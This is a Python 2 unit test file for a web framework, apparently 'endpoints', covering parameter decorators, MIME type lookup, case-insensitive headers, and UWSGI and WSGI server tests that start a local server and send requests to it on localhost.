        self.assertEqual(False, r)

        r = foo(c, **{'foo': '0'})
        self.assertEqual(False, r)

        @endpoints.decorators.param('bar', type=bool, require=True)
        def bar(self, *args, **kwargs):
            return kwargs['bar']

        r = bar(c, **{'bar': 'False'})
        self.assertEqual(False, r)

    def test_param_list(self):
        c = create_controller()

        @endpoints.decorators.param('foo', type=list)
        def foo(self, *args, **kwargs):
            return kwargs['foo']

        r = foo(c, **{'foo': ['bar', 'baz']})
        self.assertEqual(r, ['bar', 'baz'])

    def test_param_arg(self):
        c = create_controller()

        @endpoints.decorators.param('foo')
        @endpoints.decorators.param('bar')
        @endpoints.decorators.param('che')
        @endpoints.decorators.param('baz')
        def foo(self, *args, **kwargs):
            return 100

        r = foo(c, **{'foo': 1, 'bar': 2, 'che': 3, 'baz': 4})
        self.assertEqual(100, r)


class MimeTypeTest(TestCase):
    def test_default_file(self):
        test_mt = "image/jpeg"

        mt = MimeType.find_type("some/path/file.jpg")
        self.assertEqual(test_mt, mt)

        mt = MimeType.find_type("jpg")
        self.assertEqual(test_mt, mt)

        mt = MimeType.find_type("JPG")
        self.assertEqual(test_mt, mt)

        mt = MimeType.find_type(".JPG")
        self.assertEqual(test_mt, mt)

        mt = MimeType.find_type(".jpg")
        self.assertEqual(test_mt, mt)


class HeadersTest(TestCase):
    def test_lifecycle(self):
        d = Headers()
        d["foo-bar"] = 1
        self.assertEqual(1, d["Foo-Bar"])
        self.assertEqual(1, d["fOO-bAr"])
        self.assertEqual(1, d["fOO_bAr"])

    def test_pop(self):
        d = Headers()
        d['FOO'] = 1
        r = d.pop('foo')
        self.assertEqual(1, 1)

        with self.assertRaises(KeyError):
            d.pop('foo')

        with self.assertRaises(KeyError):
            d.pop('FOO')

    def test_normalization(self):

        keys = [
            "Content-Type",
            "content-type",
            "content_type",
            "CONTENT_TYPE"
        ]

        v = "foo"
        d = {
            "CONTENT_TYPE": v,
            "CONTENT_LENGTH": 1234
        }
        headers = Headers(d)

        for k in keys:
            self.assertEqual(v, headers["Content-Type"])

        headers = Headers()
        headers["CONTENT_TYPE"] = v

        for k in keys:
            self.assertEqual(v, headers["Content-Type"])

        with self.assertRaises(KeyError):
            headers["foo-bar"]

        for k in keys:
            self.assertTrue(k in headers)

    def test_iteration(self):
        hs = Headers()
        hs['CONTENT_TYPE'] = "application/json"
        hs['CONTENT-LENGTH'] = "1234"
        hs['FOO-bAR'] = "che"
        for k in hs.keys():
            self.assertRegexpMatches(k, "^[A-Z][a-z]+(?:\-[A-Z][a-z]+)*$")
            self.assertTrue(k in hs)

        for k, v in hs.items():
            self.assertRegexpMatches(k, "^[A-Z][a-z]+(?:\-[A-Z][a-z]+)*$")
            self.assertEqual(hs[k], v)

        for k in hs:
            self.assertRegexpMatches(k, "^[A-Z][a-z]+(?:\-[A-Z][a-z]+)*$")
            self.assertTrue(k in hs)


###############################################################################
# UWSGI support
###############################################################################
class UWSGIClient(object):

    application = "server_script.py"

    def __init__(self, controller_prefix, module_body, config_module_body=''):
        self.cwd = testdata.create_dir()
        self.controller_prefix = controller_prefix
        self.module_body = os.linesep.join(module_body)
        self.host = "localhost:8080"
        self.module_path = testdata.create_module(self.controller_prefix, self.module_body, self.cwd)

        self.application_path = testdata.create_file(
            self.application,
            os.linesep.join([
                "import os",
                "import sys",
                "import logging",
                "logging.basicConfig()",
                "sys.path.append('{}')".format(os.path.dirname(os.path.realpath(__file__))),
                "",
                self.get_script_imports(),
                ""
                "os.environ['ENDPOINTS_PREFIX'] = '{}'".format(controller_prefix),
                "",
                "##############################################################",
                os.linesep.join(config_module_body),
                "##############################################################",
                self.get_script_body(),
                ""
            ]),
            self.cwd
        )
        self.start()

    def get_url(self, uri):
        return "http://" + self.host + uri

    def get_script_imports(self):
        return "from endpoints.interface.wsgi import *"

    def get_script_body(self):
        """returns the script body that is used to start the server"""
        return os.linesep.join([
            "#from wsgiref.validate import validator",
            "#application = validator(Server())",
            "application = Application()",
        ])

    @classmethod
    def get_kill_cmd(cls):
        return "pkill -9 -f {}".format(cls.application)

    @classmethod
    def kill(cls):
        subprocess.call("{} > /dev/null 2>&1".format(cls.get_kill_cmd()), shell=True)

    def get_start_cmd(self):
        return " ".join([
            "uwsgi",
            "--http=:8080",
            "--show-config",
            "--master",
            "--processes=1",
            "--cpu-affinity=1",
            "--thunder-lock",
            "--http-raw-body",
            "--chdir={}".format(self.cwd),
            "--wsgi-file={}".format(self.application),
        ])

    def start(slf):
        class SThread(threading.Thread):
            """http://stackoverflow.com/questions/323972/is-there-any-way-to-kill-a-thread-in-python"""
            def __init__(self):
                super(SThread, self).__init__()
                self._stop = threading.Event()
                self.daemon = True

            def stop(self):
                self._stop.set()

            def stopped(self):
                return self._stop.isSet()

            def flush(self, line):
                sys.stdout.write(line)
                sys.stdout.flush()

            def run(self):
                process = None
                try:
                    cmd = slf.get_start_cmd()
                    process = subprocess.Popen(
                        cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        cwd=slf.cwd,
                    )

                    # Poll process for new output until finished
                    for line in iter(process.stdout.readline, ""):
                        self.flush(line)
                        if self.stopped():
                            break

                    # flush any remaining output
                    line = process.stdout.read()
                    self.flush(line)

                except Exception as e:
                    print e
                    raise

                finally:
                    count = 0
                    if process:
                        try:
                            process.terminate()
                        except OSError:
                            pass
                        else:
                            while count < 50:
                                count += 1
                                time.sleep(0.1)
                                if process.poll() != None:
                                    break

                            if process.poll() == None:
                                process.kill()

        slf.thread = SThread()
        slf.thread.start()
        time.sleep(1)

    def stop(self):
        self.thread.stop()
        self.kill()

    def get(self, uri, **kwargs):
        url = self.get_url(uri)
        kwargs.setdefault('timeout', 5)
        return self.get_response(requests.get(url, **kwargs))

    def post(self, uri, body, **kwargs):
        url = self.get_url(uri)
        if body is not None:
            kwargs['data'] = body
        kwargs.setdefault('timeout', 5)
        filepath = kwargs.pop("filepath", None)
        if filepath:
            files = {'file': open(filepath, 'rb')}
            kwargs.setdefault("files", files)
        return self.get_response(requests.post(url, **kwargs))

    def post_chunked(self, uri, body, **kwargs):
        """POST a file to the uri using a Chunked transfer, this works exactly like
        the post() method, but this will only return the body because we use curl
        to do the chunked request"""
        filepath = kwargs.pop("filepath", None)
        url = self.get_url(uri)
        body = body or {}

        # http://superuser.com/a/149335/164279
        # http://comments.gmane.org/gmane.comp.web.curl.general/10711
        cmd = " ".join([
            "curl",
            '--header "Transfer-Encoding: Chunked"',
            '-F "file=@{}"'.format(filepath),
            '-F "{}"'.format(urllib.urlencode(body, doseq=True)),
            url
        ])
        output = subprocess.check_output(cmd, shell=True)

        return output

        # https://github.com/kennethreitz/requests/blob/master/requests/models.py#L260
        # I couldn't get Requests to successfully do a chunked request, but I could
        # get curl to do it, so that's what we're going to use
#         files = {'file': open(filepath, 'rb')}
#         req = requests.Request('POST', url, data=body, files=files)
#         r = req.prepare()
#         r.headers.pop('Content-Length', None)
#         r.headers['Transfer-Encoding'] = 'Chunked'
# 
#         s = requests.Session()
#         s.stream = True
#         res = s.send(r)
#         return self.get_response(res)

        # another way to try chunked in pure python
        # http://stackoverflow.com/questions/9237961/how-to-force-http-client-to-send-chunked-encoding-http-body-in-python
        # http://stackoverflow.com/questions/17661962/how-to-post-chunked-encoded-data-in-python

        # and one more way to test it using raw sockets
        # http://lists.unbit.it/pipermail/uwsgi/2013-June/006170.html

    def get_response(self, requests_response):
        """just make request's response more endpointy"""
        requests_response.code = requests_response.status_code
        requests_response.body = requests_response.content
        return requests_response


@skipIf(requests is None, "Skipping WSGI Test because no requests module")
class UWSGITest(TestCase):

    client_class = UWSGIClient
    #client_instance = None

    def setUp(self):
        self.client_class.kill()

    def tearDown(self):
        self.client_class.kill()

    def create_client(self, *args, **kwargs):
        return self.client_class(*args, **kwargs)
#         if not self.client_instance:
#             self.client_instance = self.client_class(*args, **kwargs)
#         return self.client_instance

    def test_chunked(self):
        filepath = testdata.create_file("filename.txt", testdata.get_words(500))
        controller_prefix = 'wsgi.post_chunked'

        c = self.create_client(controller_prefix, [
            "import hashlib",
            "from endpoints import Controller",
            "class Bodykwargs(Controller):",
            "    def POST(self, **kwargs):",
            "        return hashlib.md5(kwargs['file'].file.read()).hexdigest()",
            "",
            "class Bodyraw(Controller):",
            "    def POST(self, **kwargs):",
            "        return len(self.request.body)",
            "",
        ])

        size = c.post_chunked('/bodyraw', {"foo": "bar", "baz": "che"}, filepath=filepath)
        self.assertGreater(int(size), 0)

        with codecs.open(filepath, "rb", encoding="UTF-8") as fp:
            h1 = hashlib.md5(fp.read().encode("UTF-8")).hexdigest()
            h2 = c.post_chunked('/bodykwargs', {"foo": "bar", "baz": "che"}, filepath=filepath)
            self.assertEqual(h1, h2.strip('"'))

    def test_list_param_decorator(self):
        controller_prefix = "lpdcontroller"
        c = self.create_client(controller_prefix, [
            "from endpoints import Controller, decorators",
            "class Listparamdec(Controller):",
            "    @decorators.param('user_ids', 'user_ids[]', type=int, action='append_list')",
            "    def GET(self, **kwargs):",
            "        return int(''.join(map(str, kwargs['user_ids'])))",
            ""
        ])

        r = c.get('/listparamdec?user_ids[]=12&user_ids[]=34')
        self.assertEqual("1234", r.body)


    def test_post_file(self):
        filepath = testdata.create_file("filename.txt", "this is a text file to upload")
        controller_prefix = 'wsgi.post_file'
        c = self.create_client(controller_prefix, [
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def POST(self, *args, **kwargs):",
            "        return kwargs['file'].filename",
            "",
        ])

        r = c.post('/', {"foo": "bar", "baz": "che"}, filepath=filepath)
        self.assertEqual(200, r.code)
        self.assertTrue("filename.txt" in r.body)

    def test_post_file_with_param(self):
        """make sure specifying a param for the file upload works as expected"""
        filepath = testdata.create_file("post_file_with_param.txt", "post_file_with_param")
        controller_prefix = 'wsgi.post_file_with_param'
        c = self.create_client(controller_prefix, [
            "from endpoints import Controller, decorators",
            "class Default(Controller):",
            "    @decorators.param('file')",
            "    def POST(self, *args, **kwargs):",
            "        return kwargs['file'].filename",
            "",
        ])

        r = c.post('/', {"foo": "bar", "baz": "che"}, filepath=filepath)
        self.assertEqual(200, r.code)
        self.assertTrue("post_file_with_param.txt" in r.body)

    def test_post_basic(self):
        controller_prefix = 'wsgi.post'
        c = self.create_client(controller_prefix, [
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(*args, **kwargs): pass",
            "    def POST(*args, **kwargs): pass",
            "    def POST_v2(*args, **kwargs): return kwargs['foo']",
            "",
        ])

        r = c.post('/', {})
        self.assertEqual(204, r.code)

        r = c.post('/', None, headers={"content-type": "application/json"})
        self.assertEqual(204, r.code)

        r = c.post('/', None)
        self.assertEqual(204, r.code)

        r = c.post('/', json.dumps({}), headers={"content-type": "application/json"})
        self.assertEqual(204, r.code)

        r = c.post('/', json.dumps({"foo": "bar"}), headers={"content-type": "application/json", "Accept": "application/json;version=v2"})
        self.assertEqual(200, r.code)
        self.assertEqual('"bar"', r.body)

        r = c.post('/', {"foo": "bar"}, headers={"Accept": "application/json;version=v2"})
        self.assertEqual(200, r.code)
        self.assertEqual('"bar"', r.body)

    def test_post_ioerror(self):
        """turns out this is pretty common, a client will make a request and disappear, 
        but now that we lazy load the body these errors are showing up in our logs where
        before they were silent because they failed, causing the process to be restarted,
        before they ever made it really into our logging system"""

        controller_prefix = 'wsgi.post_ioerror'
        c = self.create_client(
            controller_prefix,
            [
                "from endpoints import Controller",
                "",
                "class Default(Controller):",
                "    def POST(*args, **kwargs):",
                "        pass",
                "",
            ],
            [
                "from endpoints import Request as EReq",
                "",
                "class Request(EReq):",
                "    @property",
                "    def body_kwargs(self):",
                "        raise IOError('timeout during read(0) on wsgi.input')",
                "",
                "Application.request_class = Request",
                "",
            ],
        )

        r = c.post(
            '/',
            json.dumps({"foo": "bar"}),
            headers={
                "content-type": "application/json",
            }
        )
        self.assertEqual(408, r.code)

    def test_404_request(self):
        controller_prefix = 'wsgi404.request404'
        c = self.create_client(controller_prefix, [
            "from endpoints import Controller",
            "class Foo(Controller):",
            "    def GET(self): pass",
            "",
        ])

        r = c.get('/foo/bar/baz?che=1&boo=2')
        self.assertEqual(404, r.code)

    def test_response_headers(self):
        controller_prefix = 'resp_headers.resp'
        c = self.create_client(controller_prefix, [
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(self):",
            "        self.response.set_header('FOO_BAR', 'check')",
            "",
        ])

        r = c.get('/')
        self.assertEqual(204, r.code)
        self.assertTrue("foo-bar" in r.headers)

    def test_file_stream(self):
        content = "this is a text file to stream"
        filepath = testdata.create_file("filename.txt", content)
        controller_prefix = 'wsgi.post_file'
        c = self.create_client(controller_prefix, [
            "from endpoints import Controller",
            "class Default(Controller):",
            "    def GET(self, *args, **kwargs):",
            "        f = open('{}')".format(filepath),
            "        self.response.set_header('content-type', 'text/plain')",
            "        return f",
            "",
        ])

        r = c.get('/')
        self.assertEqual(200, r.code)
        self.assertEqual(content, r.body)
        #self.assertTrue(r.body)


###############################################################################
# WSGI Server support
###############################################################################
class WSGIClient(UWSGIClient):
    def get_script_imports(self):
        return "from endpoints.interface.wsgi import *"

    def get_script_body(self):
        """returns the script body that is used to start the server"""
        return os.linesep.join([
            "os.environ['ENDPOINTS_HOST'] = '{}'".format(self.host),
            "s = Server()",
            "s.serve_forever()"
        ])

    def get_start_cmd(self):
        return "python {}/{}".format(self.cwd, self.application)


@skipIf(requests is None, "Skipping wsgi server Test because no requests module")
class WSGITest(UWSGITest):
    client_class = WSGIClient

    def test_chunked(self):
        raise SkipTest("chunked is not supported in Python WSGIClient")

